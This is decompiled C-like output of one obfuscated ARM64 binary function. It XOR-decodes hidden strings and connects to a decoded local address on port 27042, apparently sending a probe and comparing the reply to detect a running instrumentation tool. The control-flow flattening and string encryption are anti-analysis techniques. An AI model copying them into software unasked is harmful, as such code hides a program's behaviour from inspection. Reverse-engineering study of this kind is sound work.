// Function: FUN_001e8090
// Entry: 001e8090

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint FUN_001e8090(undefined4 *param_1)

{
  undefined8 uVar1;
  undefined8 *__optval;
  undefined1 *puVar2;
  undefined8 *puVar3;
  int iVar4;
  long lVar5;
  undefined1 *puVar6;
  ulong unaff_x19;
  int unaff_w21;
  uint unaff_w26;
  undefined8 *unaff_x27;
  undefined8 *unaff_x28;
  ulong uVar7;
  undefined1 auStack_d0 [8];
  long local_c8;
  undefined8 local_c0;
  undefined8 uStack_b8;
  undefined4 *local_a8;
  undefined8 *local_a0;
  sockaddr *local_98;
  uint local_8c;
  long local_88;
  
  local_c8 = tpidr_el0;
  local_88 = *(long *)(local_c8 + 0x28);
  uStack_b8 = _UNK_00102828;
  local_c0 = _DAT_00102820;
  puVar3 = (undefined8 *)auStack_d0;
  puVar2 = (undefined1 *)0xc0eb019135e10a40;
  local_a8 = param_1;
LAB_001e814c:
  do {
    while( true ) {
      while (puVar6 = puVar2, __optval = local_a0, uVar1 = local_c0, puVar2 = puVar6,
            (long)puVar6 < -0x1795c34d98dcd73d) {
        if ((long)puVar6 < -0x63d6c57ea08e5e11) {
          if ((long)puVar6 < -0x74a2d55b8cf192ad) {
            if (puVar6 == (undefined1 *)0x82d6800f37fa837b) {
              _DAT_001f7a50 = _DAT_001f7a50 ^ 0xedededededededed;
              uRam00000000001f7a58 = uRam00000000001f7a58 ^ 0xedededededededed;
              _DAT_001f7a60 = _DAT_001f7a60 ^ 0xedededededededed;
              uRam00000000001f7a68 = uRam00000000001f7a68 ^ 0xedededededededed;
              DAT_001f8344 = CONCAT13(1,(undefined3)DAT_001f8344);
              _DAT_001f7a70 = _DAT_001f7a70 ^ 0xedededededededed;
              uRam00000000001f7a78 = uRam00000000001f7a78 ^ 0xedededededededed;
              _DAT_001f7a80 = _DAT_001f7a80 ^ 0xedededededededed;
              uRam00000000001f7a88 = uRam00000000001f7a88 ^ 0xedededededededed;
              _DAT_001f7a90 = _DAT_001f7a90 ^ 0xedededededededed;
              uRam00000000001f7a98 = uRam00000000001f7a98 ^ 0xedededededededed;
              _DAT_001f7aa0 = _DAT_001f7aa0 ^ 0xedededededededed;
              uRam00000000001f7aa8 = uRam00000000001f7aa8 ^ 0xedededededededed;
              _DAT_001f7ab0 = _DAT_001f7ab0 ^ 0xedededededededed;
              uRam00000000001f7ab8 = uRam00000000001f7ab8 ^ 0xedededededededed;
              _DAT_001f7ac0 = _DAT_001f7ac0 ^ 0xedededededededed;
              uRam00000000001f7ac8 = uRam00000000001f7ac8 ^ 0xedededededededed;
              _DAT_001f7ad0 = _DAT_001f7ad0 ^ 0xedededededededed;
              uRam00000000001f7ad8 = uRam00000000001f7ad8 ^ 0xedededededededed;
              DAT_001f7ae0 = DAT_001f7ae0 ^ 0xedededededededed;
              puVar2 = (undefined1 *)0x55d58c2b8d472655;
            }
            else {
              puVar2 = (undefined1 *)0x5e9249b5376f08fa;
              if ((puVar6 != (undefined1 *)0x87fde1166a77f06e) &&
                 (puVar2 = puVar6, puVar6 == (undefined1 *)0x8b1dacf6763fda11)) {
                iVar4 = FUN_001ebe70(0,1,&DAT_001f8338);
                puVar2 = (undefined1 *)0x6de583d82abca3c2;
                if (iVar4 != 0) {
                  puVar2 = (undefined1 *)0xdbbbecaa54122c5b;
                }
              }
            }
          }
          else if (puVar6 == (undefined1 *)0x8b5d2aa4730e6d53) {
            local_8c = 0;
            *local_a8 = 6;
            puVar2 = (undefined1 *)0xf54be9e395389537;
          }
          else if (puVar6 == (undefined1 *)0x9173a1fc59339595) {
            iVar4 = FUN_001ebe70(0,1,&DAT_001f8344);
            puVar2 = (undefined1 *)0xba43a2b0d5cab0ba;
            if (iVar4 != 0) {
              puVar2 = (undefined1 *)0x43d4efcefc88fa10;
            }
          }
          else if (puVar6 == (undefined1 *)0x932656effdaaeaa5) {
            DAT_001f7a38 = DAT_001f7a38 ^ 0x7b;
            DAT_001f7a39 = DAT_001f7a39 ^ 0x7b;
            DAT_001f7a30 = DAT_001f7a30 ^ 0x7b7b7b7b7b7b7b7b;
            DAT_001f8344._0_2_ = CONCAT11(1,(undefined1)DAT_001f8344);
            puVar2 = &DAT_1b767e91f4196530;
          }
        }
        else if ((long)puVar6 < -0x3ed04c030289d596) {
          if (puVar6 == (undefined1 *)0x9c293a815f71a1ef) {
            puVar2 = (undefined1 *)0x4bfd6150022cba99;
            if (DAT_001f8344._3_1_ == '\0') {
              puVar2 = (undefined1 *)0x82d6800f37fa837b;
            }
          }
          else if (puVar6 == (undefined1 *)0xba43a2b0d5cab0ba) {
            puVar2 = (undefined1 *)0x52d98d60f83cf13e;
            if (DAT_001f8348 == '\0') {
              puVar2 = (undefined1 *)0xcc4911e8d0a08389;
            }
          }
          else if (puVar6 == (undefined1 *)0xc0eb019135e10a40) {
            puVar2 = (undefined1 *)0x8b1dacf6763fda11;
          }
        }
        else if ((long)puVar6 < -0x2ec94b8438cd42d5) {
          if (puVar6 == (undefined1 *)0xc12fb3fcfd762a6a) {
            uVar7 = unaff_x19;
            if (0x7f < unaff_x19) {
              uVar7 = 0x80;
            }
            DAT_001f8344 = 0;
            *unaff_x28 = CONCAT35(DAT_001f7ae8._5_3_,(undefined5)DAT_001f7ae8);
            *(ulong *)((long)unaff_x28 + 5) =
                 CONCAT17(DAT_001f7af4,
                          CONCAT16(DAT_001f7af3,
                                   CONCAT15(DAT_001f7af2,CONCAT14(DAT_001f7af1,ram0x001f7aed))));
            lVar5 = FUN_001d17ac(unaff_x27,uVar7,unaff_x28,0xc);
            unaff_w26 = (uint)(lVar5 != 0);
            puVar2 = (undefined1 *)0xee32369f7888ebdf;
          }
          else if (puVar6 == (undefined1 *)0xcc4911e8d0a08389) {
            DAT_001f7af1 = DAT_001f7af1 ^ 0xd9;
            DAT_001f7af2 = DAT_001f7af2 ^ 0xd9;
            DAT_001f7af3 = DAT_001f7af3 ^ 0xd9;
            DAT_001f7af4 = DAT_001f7af4 ^ 0xd9;
            uVar7 = CONCAT35(DAT_001f7ae8._5_3_,(undefined5)DAT_001f7ae8) ^ 0xd9d9d9d9d9d9d9d9;
            DAT_001f7ae8._0_5_ = (undefined5)uVar7;
            DAT_001f7ae8._5_3_ = (undefined3)(uVar7 >> 0x28);
            ram0x001f7aed = CONCAT13(DAT_001f7af0,DAT_001f7ae8._5_3_) ^ 0xd9000000;
            DAT_001f8348 = '\x01';
            puVar2 = (undefined1 *)0xc12fb3fcfd762a6a;
          }
        }
        else if (puVar6 == (undefined1 *)0xd136b47bc732bd2b) {
          local_a0[1] = uStack_b8;
          *__optval = uVar1;
          setsockopt(unaff_w21,1,0x14,__optval,0x10);
          iVar4 = connect(unaff_w21,local_98,0x10);
          puVar2 = (undefined1 *)0x1db1d1f44155ec69;
          if (iVar4 != -1) {
            puVar2 = (undefined1 *)0x87fde1166a77f06e;
          }
        }
        else if (puVar6 == (undefined1 *)0xdbbbecaa54122c5b) {
          puVar2 = (undefined1 *)0x8b1dacf6763fda11;
        }
      }
      if ((long)puVar6 < 0x4bfd6150022cba99) break;
      if ((long)puVar6 < 0x57dab7dd661b1869) {
        puVar2 = (undefined1 *)0x55d58c2b8d472655;
        if (((puVar6 != (undefined1 *)0x4bfd6150022cba99) &&
            (puVar2 = (undefined1 *)0xc12fb3fcfd762a6a, puVar6 != (undefined1 *)0x52d98d60f83cf13e))
           && (puVar2 = puVar6, puVar6 == (undefined1 *)0x55d58c2b8d472655)) {
          DAT_001f8340 = 0;
          write(unaff_w21,&DAT_001f7a50,0x97);
          FUN_001cc250(unaff_x27,0,0x80);
          unaff_x19 = recvfrom(unaff_w21,unaff_x27,0x80,0,(sockaddr *)0x0,(socklen_t *)0x0);
          puVar2 = (undefined1 *)0x57dab7dd661b1869;
          if (0 < (long)unaff_x19) {
            puVar2 = (undefined1 *)0x2ac799c399899ac3;
          }
        }
      }
      else if ((long)puVar6 < 0x6de583d82abca3c2) {
        if (puVar6 == (undefined1 *)0x57dab7dd661b1869) {
LAB_001e8138:
          unaff_w26 = 0;
          puVar2 = (undefined1 *)0xee32369f7888ebdf;
        }
        else if (puVar6 == (undefined1 *)0x5e9249b5376f08fa) {
          iVar4 = FUN_001ebe70(0,1,&DAT_001f8340);
          puVar2 = (undefined1 *)0x9c293a815f71a1ef;
          if (iVar4 != 0) {
            puVar2 = (undefined1 *)0xe86a3cb2672328c3;
          }
        }
      }
      else if (puVar6 == (undefined1 *)0x6de583d82abca3c2) {
        puVar2 = (undefined1 *)0x76eec756bc9b1bd1;
        if (DAT_001f8344._1_1_ == '\0') {
          puVar2 = (undefined1 *)0x932656effdaaeaa5;
        }
      }
      else if (puVar6 == (undefined1 *)0x76eec756bc9b1bd1) {
        puVar2 = &DAT_1b767e91f4196530;
      }
    }
    if ((long)puVar6 < 0x1db1d1f44155ec69) {
      if ((long)puVar6 < -0xab4161c6ac76ac9) {
        puVar2 = (undefined1 *)0x5e9249b5376f08fa;
        if ((puVar6 != (undefined1 *)0xe86a3cb2672328c3) &&
           (puVar2 = puVar6, puVar6 == (undefined1 *)0xee32369f7888ebdf)) {
          FUN_001d8554(unaff_w21);
          puVar2 = (undefined1 *)0xf54be9e395389537;
          local_8c = unaff_w26;
        }
      }
      else if (puVar6 == &DAT_1b767e91f4196530) {
        local_98 = (sockaddr *)(puVar3 + -2);
        DAT_001f8338 = 0;
        local_a0 = puVar3 + -4;
        unaff_x27 = puVar3 + -0x14;
        unaff_x28 = puVar3 + -0x16;
        FUN_001cc250(local_98,0,0x10);
        *(undefined2 *)(puVar3 + -2) = 2;
        inet_aton((char *)&DAT_001f7a30,(in_addr *)((long)puVar3 + -0xc));
        *(undefined2 *)((long)puVar3 + -0xe) = 0xa269;
        unaff_w21 = socket(2,1,0);
        puVar3 = unaff_x28;
        puVar2 = (undefined1 *)0x8b5d2aa4730e6d53;
        if (-1 < unaff_w21) {
          puVar2 = (undefined1 *)0xd136b47bc732bd2b;
        }
      }
      else if (puVar6 == (undefined1 *)0xf54be9e395389537) {
        if (*(long *)(local_c8 + 0x28) != local_88) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return local_8c & 1;
      }
      goto LAB_001e814c;
    }
    if (puVar6 == (undefined1 *)0x1db1d1f44155ec69) goto LAB_001e8138;
    puVar2 = (undefined1 *)0x9173a1fc59339595;
    if ((puVar6 != (undefined1 *)0x2ac799c399899ac3) &&
       (puVar2 = puVar6, puVar6 == (undefined1 *)0x43d4efcefc88fa10)) {
      puVar2 = (undefined1 *)0x9173a1fc59339595;
    }
  } while( true );
}


